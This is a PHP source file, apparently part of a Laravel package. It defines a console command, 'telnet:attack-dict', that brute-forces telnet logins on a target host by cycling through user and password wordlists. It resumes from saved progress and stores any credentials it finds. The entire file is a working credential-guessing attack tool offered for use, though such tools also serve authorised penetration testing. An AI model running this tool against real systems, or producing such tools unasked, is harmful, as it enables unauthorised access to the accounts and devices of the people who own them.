<?php

namespace Ycoya\LaravelTelnetBruteForce\Console\Commands;

use Illuminate\Console\Command;
use Illuminate\Support\Arr;
use Illuminate\Support\Facades\Storage;
use function Symfony\Component\String\length;
use Ycoya\LaravelTelnetBruteForce\Telnet\TelnetService;

class TelnetBruteForceDictionary extends Command
{
    /**
     * Telnet brute force attack dictionary
     *
     * string $host Host name or IP address
     * int $port TCP port number
     * float $connect_timeout the timeout for connecting to the host
     * string $prompt the default prompt
     * float $socket_timeout the timeout to wait for new data
     * float|null $full_line_timeout The maximum time to wait for before assuming the line is not carriage return terminated. null for infinity
     * boolean debug to output more information in laravel.log
     * boolean reset to reset the saved values. Restart from the first username and password again.
     * string userDb path to users list to try to log in
     * string passDb path to password list to try to log in.
     * string tag If more than one instance is running, it use the tag as part of the filename to save the progress.
     *
     * @var string
     */
    protected $signature = 'telnet:attack-dict {--host=127.0.0.1} {--port=23}
     {--connect_timeout=1.0 : the timeout for connecting to the host.} 
     {--socket_timeout=10.0 : the timeout to wait for new data.}
     {--full_line_timeout=0.10 : The maximum time to wait for before assuming the line is not carriage return terminated.}
     {--debug : output more information in laravel.log. }
     {--reset : reset the saved values. Restart from the first username and password again.}
     {--resetFound : reset only the username and password saved previously identified as correct by the program. It does not reset the progress saved by dictionary.}
     {--userDb= : Path to users list.}
     {--passDb= : Path to the passwords list.}
     {--tag=0 : If more than one instance is running, different files saved ex: 0_password_cursors.txt, 1_password_cursors.txt}';

    /**
     * The console command description.
     *
     * @var string
     */
    protected $description = 'Command to do a telnet brute force by using an external user password dictionary list.';

    /*
     * string||Array $userDb
     */
    private $userDb;

    /*
    * integer $userDbCursor
    */
    private $userDbCursor = 0;


    /*
     * To record where it left of the last time for users list.
    * string $userDbCursorSavedPath
    */
    private $userDbCursorSavedPath;


    /*
    * bool||string||Array $passDb
    */
    private $passDb;

    /*
    *
    * integer $passDbCursor
    */
    private $passDbCursor = 0;

   /*
   * To record where it left of the last time for passwords list.
   * string $userDbCursorSavedPath
   */
    private $passDbCursorSavedPath;

    /**
     * To saved the record when password was found.
     * string $passwordFoundPath
     */
    private $passwordFoundPath;

    /**
     * Execute the console command.
     *
     * @return int
     */
    public function handle()
    {
        $tag  = $this->option('tag');
        $host = $this->option('host');
        $this->userDbCursorSavedPath = "telnet_brute_force_dict/$host/{$tag}_users_cursor.txt";
        $this->passDbCursorSavedPath = "telnet_brute_force_dict/$host/{$tag}_passwords_cursor.txt";
        $this->passwordFoundPath     = "telnet_brute_force_dict/$host/{$tag}_password_found.txt";

        if($this->option('resetFound')) {
           Storage::delete($this->passwordFoundPath);
        }

        $passwordFound = Storage::get($this->passwordFoundPath);
        if(!is_null($passwordFound)) {
            $this->info("credentials found: $passwordFound");
            return Command::SUCCESS;
        }

        $options = Arr::only($this->options(), ['host', 'port', 'host', 'connect_timeout', 'socket_timeout', 'full_line_timeout']);

        $userDbPath = $this->option('userDb');
        if(!$userDbPath) {
            $this->error("You must enter a path to a file that will be used as users for --userDb option");
            return Command::FAILURE;
        }

        $passDbPath= $this->option('passDb');
        if(!$passDbPath) {
            $this->error("You must enter a path to a file that will be used as pssword for --passDb option");
            return Command::FAILURE;
        }

        if(!$this->option('socket_timeout')) {
            $this->error("You must enter a positive float number or integer");
            return Command::FAILURE;
        }

        $this->userDb = Storage::disk('ycoyaTelnetBruteForceDisk')->get($userDbPath) ?? Storage::get($userDbPath);
        $this->passDb = Storage::disk('ycoyaTelnetBruteForceDisk')->get($passDbPath) ?? Storage::get($passDbPath);

        if(is_null($this->userDb)) {
            $this->error("File doesn't exist for userDb in $userDbPath");
            return Command::FAILURE;
        }

        if(is_null($this->passDb)) {
            $this->error("File doesn't exist for passDb in $passDbPath");
            return Command::FAILURE;
        }

        $this->userDb = collect(explode(PHP_EOL , $this->userDb));
        $this->passDb = collect(explode(PHP_EOL , $this->passDb));

        $this->userDb = $this->userDb->filter()->values();
        $this->passDb = $this->passDb->unique()->values();


        $this->userDbCursor = Storage::get($this->userDbCursorSavedPath) ?? 0;
        $this->passDbCursor = Storage::get($this->passDbCursorSavedPath) ?? 0;

        if($this->option('reset')) {
            $this->userDbCursor = 0;
            $this->passDbCursor = 0;
        }

        if($this->userDbCursor != 0) {
            $this->info("Found progress saved for userDb using: index $this->userDbCursor.");
        }

        if($this->passDbCursor != 0) {
            $this->info("Found progress saved for passDb using: index $this->passDbCursor.");
        }


        $telnet = new TelnetService(...$options);
        $telnet->setNextUsernamePasswordFromDictCallback([$this, "nextUsernamePassword"]);
        $telnet->setInfoLogCallback([$this, 'info']);
        $telnet->setQuestionLogCallback([$this, 'question']);
        $telnet->setErrorLogCallback([$this, 'error']);
        if($this->option('debug')) {
            $telnet->getTelnetCore()->setDebugThis(true);
        }
        $start = now();
        if($telnet->bruteForceWithDictionary()) {
            $username = $this->userDb[$this->userDbCursor] ?? "no-username-found";
            $password = $this->passDb[$this->passDbCursor - 1] ?? "no-password-found";
            $this->info("credentials found");
            Storage::put($this->passwordFoundPath, "$username:$password");
            return Command::SUCCESS;
        }
        $time = $start->diffInSeconds(now());
        $this->info("credentials not found.");
        if($time < 2) {
            $this->info("Try to use --reset option to restart the user and password list.");
        }
        return Command::SUCCESS;
    }

    public function nextUsernamePassword()
    {
        $credentials = $this->processCredentials();
        //save cursors
        Storage::put($this->userDbCursorSavedPath, $this->userDbCursor);
        Storage::put($this->passDbCursorSavedPath, $this->passDbCursor);
        //increase cursor
        $this->passDbCursor++;

        return $credentials;
    }

    /**
     * @return array
     */
    private function processCredentials(): array
    {
        $credentials = $this->getCredentials();
        if (empty($credentials)) {
            return $credentials;
        }

        if (is_null($credentials["password"])) {
            $this->userDbCursor++;
            $this->passDbCursor = 0;
            $credentials = $this->getCredentials();
            if (empty($credentials)) {
                return $credentials;
            }
        }
        return $credentials;
    }
    /**
     * @return array
     */
    private function getCredentials(): array
    {
        $username = $this->userDb[$this->userDbCursor] ?? null;
        $password = $this->passDb[$this->passDbCursor] ?? null;
        $credentials = compact('username', 'password');
        if(is_null($username)) {
            return [];
        };
        return $credentials;
    }


}
